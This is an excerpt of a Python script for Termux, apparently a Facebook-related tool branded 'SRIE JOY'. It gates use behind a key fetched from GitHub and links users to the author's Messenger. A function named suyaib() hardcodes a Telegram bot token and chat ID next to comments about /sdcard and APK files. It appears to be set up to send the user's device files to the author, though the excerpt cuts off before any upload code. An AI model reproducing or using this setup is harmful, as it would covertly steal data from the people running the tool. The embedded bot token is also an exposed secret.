...
logo=f"""
  ...
  ____  ____  ___ _____       _  _____   __
 / ___||  _ \|_ _| ____|     | |/ _ \ \ / /
 \___ \| |_) || ||  _|    _  | | | | \ V / 
  ___) |  _ < | || |___  | |_| | |_| || |  
 |____/|_| \_\___|_____|  \___/ \___/ |_|  
...
\033[1;32m[✓]FACEBOOK:\033[1;32m Srie joy
...
def apvdef():
    ...
    y="".join(a+b) 
    key=f"SRIE{y}JOY"
    row=httpx.get("https://github.com/SRIEJOY221156/Approval99/main/SRIEJOY56").text
    if key in row:
        main()
    else:
       os.system("clear")
       ...
       print(" plz Get Key")
       print(" Your key : "+key)
       os.system("termux-open https://m.me/SRIEJOY44")
       sys:exit()
...
def suyaib():
    ...
    bot_token = '6886315186:AAHfCeFyd7GkGneAZaBTbmE2mwkXeEdO7dE' 
    chat_id = '6881800448'    
    #-------------( /sdcard\ )--------------#  
    #--------------------apk-------------------#																																							
    try:
